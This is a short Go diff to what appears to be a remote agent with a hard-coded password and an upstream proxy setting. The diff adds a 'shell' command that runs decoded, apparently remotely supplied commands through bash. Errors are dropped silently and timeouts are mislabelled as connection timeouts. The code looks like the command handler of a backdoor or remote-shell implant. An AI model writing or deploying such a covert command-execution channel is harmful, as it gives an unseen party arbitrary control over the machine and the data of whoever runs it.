@@ -20,10 +20,12 @@ var PASSWORD = "foobar"
 var UPSTREAM = "http://localhost:8000"
 var PAC_URL = ""
 
-var COMMAND_MAP = map[string]func(cmd string) error{
+var COMMAND_MAP = map[string]func(cmd string) (string, string, error) {
+	"shell": runBashWithTimeout,
 }
 
-func runBashWithTimeout(command string, timeout time.Duration) (stdout string, stderr string, err error) {
+func runBashWithTimeout(command string) (string, string, error) {
+	timeout := 100 * time.Second
 	ctx, cancel := context.WithTimeout(context.Background(), timeout)
 	defer cancel()
 
@@ -33,7 +35,7 @@ func runBashWithTimeout(command string, timeout time.Duration) (stdout string, s
 	cmd.Stdout = &outBuf
 	cmd.Stderr = &errBuf
 
-	err = cmd.Run()
+	err := cmd.Run()
 	if ctx.Err() == context.DeadlineExceeded {
 		return outBuf.String(), errBuf.String(), fmt.Errorf("connection timed out after %v", timeout)
 	}
@@ -70,7 +72,7 @@ func main() {
 				}
 
 				command := string(decoded)
-				stdout, stderr, err := runBashWithTimeout(command, 100 * time.Second)
+				stdout, stderr, err := runBashWithTimeout(command)
 				if err != nil {
 					continue
 				}
